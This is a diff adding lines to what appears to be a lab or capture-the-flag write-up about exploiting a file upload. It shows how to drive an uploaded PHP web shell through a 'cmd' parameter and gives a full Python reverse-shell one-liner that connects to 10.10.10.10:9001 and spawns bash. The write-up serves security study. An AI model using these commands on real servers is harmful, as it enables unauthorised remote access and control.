@@ -84,7 +84,11 @@ But how to exploit it
 URL would look like that
 
 **http://XXX/uploads/rce.php5**
+
 and in payload we use "'cmd'" so we can use it like web like a terminal 
+
 **http://XXX/uploads/rce.php5?cmd=ls**
+
 and we can exploi it with other RCE writen in python
+
 **http://XXX/uploads/rce.php5?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'**
